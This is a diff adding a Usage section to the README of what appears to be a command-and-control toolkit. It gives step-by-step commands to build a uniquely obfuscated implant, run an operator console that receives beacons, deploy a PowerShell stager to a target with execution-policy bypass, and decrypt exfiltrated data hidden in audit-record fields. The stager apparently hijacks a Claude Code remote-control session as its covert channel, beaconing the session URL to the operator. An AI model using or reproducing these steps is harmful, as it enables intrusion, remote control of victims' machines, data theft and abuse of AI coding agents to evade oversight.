@@ -70,13 +70,63 @@ assemble logic              -->  out/<id>/c4-implant.ps1
 build/assemble_stager.py    -->  out/<id>/rc_stager_full.ps1
 ```
 
-Run the full pipeline (codebook → dataset → config → assemble → stager):
+## Usage
+
+### 1. Generate an operator key pair
+
+```bash
+cd c4_protocol
+python operator/New-X25519Key.py --out operator/operator_key.bin
+```
+
+This writes the private key to `operator/operator_key.bin` and prints the public key. Keep the private key safe — it's needed to decrypt exfiltrated results.
+
+### 2. Build an implant instance
 
 ```bash
 python run.py --public-key operator/operator_key.bin
 ```
 
-This produces a self-contained stager under `out/<implant-id>/` with a unique codebook, encrypted vault, and the implant + PshAgent baked in-memory.
+This runs the full pipeline (codebook → dataset → config → assemble → stager) and produces a unique instance under `out/<implant-id>/`. Each instance gets its own randomized codebook, salt, encrypted vault, and stager.
+
+Optional flags:
+
+```bash
+python run.py --public-key operator/operator_key.bin \
+  --tool-codes 50          # codewords per tool (default: 50)
+  --param-codes 100        # codewords per parameter (default: 100)
+  --seed 42                # fixed seed for reproducible builds
+  --pshagent-dir ../PshAgent  # custom PshAgent module path
+  --step codebook          # run only one step (codebook|dataset|config|assemble|stager)
+```
+
+### 3. Start the operator console
+
+```bash
+python operator/c4_server.py --port 9050 --tcp-port 9090
+```
+
+The console listens for beacon check-ins on HTTP (`:9050`) and TCP (`:9090`). When a stager beacons in with a bridge URL, use `interact <name>` to open a browser session and start issuing commands.
+
+### 4. Deploy the stager
+
+Copy `out/<implant-id>/rc_stager_full.ps1` to the target. It contains everything needed — the implant, PshAgent, and MCP server — all loaded in-memory.
+
+On the target:
+
+```powershell
+powershell -ExecutionPolicy Bypass -File rc_stager_full.ps1
+```
+
+The stager launches a Claude Code remote-control session and beacons the session URL back to the operator's TCP listener.
+
+### 5. Decrypt results
+
+Use the operator's private key with `operator/Decrypt-AuditRecord.ps1` to decrypt the `verification_record` field from audit reports:
+
+```powershell
+.\operator\Decrypt-AuditRecord.ps1 -PrivateKeyPath operator\operator_key.bin -Record "<base64 blob>"
+```
 
 ## Components
 
